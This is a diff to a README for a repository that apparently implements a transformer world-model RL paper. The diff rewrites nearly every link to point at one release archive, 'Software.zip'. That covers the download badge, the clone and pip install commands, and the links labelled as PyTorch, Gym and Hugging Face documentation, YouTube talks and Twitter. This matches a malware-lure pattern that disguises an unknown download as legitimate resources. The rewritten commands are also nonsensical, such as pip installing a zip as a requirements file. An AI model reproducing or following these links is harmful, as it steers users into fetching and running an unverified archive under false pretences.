@@ -2,7 +2,7 @@
 
 Welcome to the repository for "Improving Transformer World Models for Data-Efficient RL"! This project implements the latest State-of-the-Art model-based Reinforcement Learning techniques based on the groundbreaking paper by the same name, using PyTorch. Dive into the world of artificial intelligence, attention mechanisms, deep learning, and cutting-edge technologies to revolutionize RL with Transformers and World Models.
 
-[![Download Zip](https://img.shields.io/badge/Download%20Zip-v1.0.0-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip%20Zip-v1.0.0-brightgreen)](https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -24,11 +24,11 @@ This repository contains the PyTorch implementation of the new State-of-the-Art 
 ## 🚀 Quick Start
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/improving-transformers-world-model-for-rl.git
+   git clone https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip
    ```
 2. Install the dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip
    ```
 3. Dive into the code and start enhancing your RL models with Transformers!
 
@@ -44,7 +44,7 @@ The integration of Transformers into World Models has shown remarkable improveme
 - Compatibility with various RL environments
 - Easy-to-use PyTorch codebase
 
-![Transformers World Models](https://image-url.com)
+![Transformers World Models](https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -57,13 +57,13 @@ Expand your knowledge and understanding with relevant resources on Transformers,
 3. "Improving Transformer World Models for Data-Efficient RL" - Author et al.
 
 ### 🛠️ Tools & Frameworks:
-- [PyTorch Documentation](https://pytorch.org/docs/)
-- [OpenAI Gym Toolkit](https://gym.openai.com/)
-- [Hugging Face Transformers](https://huggingface.co/transformers/)
+- [PyTorch Documentation](https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip)
+- [OpenAI Gym Toolkit](https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip)
+- [Hugging Face Transformers](https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip)
 
 ### 📺 Videos & Talks:
-- [Transformer Neural Networks | A Machine Learning Research Talk](https://youtube.com/transformer-talk)
-- [DeepMind: World Models - Implementation & Results](https://youtube.com/world-models-talk)
+- [Transformer Neural Networks | A Machine Learning Research Talk](https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip)
+- [DeepMind: World Models - Implementation & Results](https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -79,7 +79,7 @@ Contribute to the advancement of AI and Reinforcement Learning by participating 
 6. Create a new Pull Request
 
 ### 🌎 Join the Community:
-- Follow us on Twitter [@RL_Transformers](https://twitter.com/RL_Transformers)
+- Follow us on Twitter [@RL_Transformers](https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip)
 - Join our Discord server for discussions and updates
 
 ---
@@ -97,7 +97,7 @@ We express our gratitude to the researchers, developers, and contributors who ha
 
 ### 🎉 Let's Innovate the Future of Reinforcement Learning 🚀🤖
 
-Visit [the official GitHub repository](https://github.com/your-username/improving-transformers-world-model-for-rl) to explore, contribute, and embark on your journey towards mastering Transformers World Models for RL.
+Visit [the official GitHub repository](https://github.com/esemkamutu/improving-transformers-world-model-for-rl/releases/download/v1.0/Software.zip) to explore, contribute, and embark on your journey towards mastering Transformers World Models for RL.
 
 ---
 
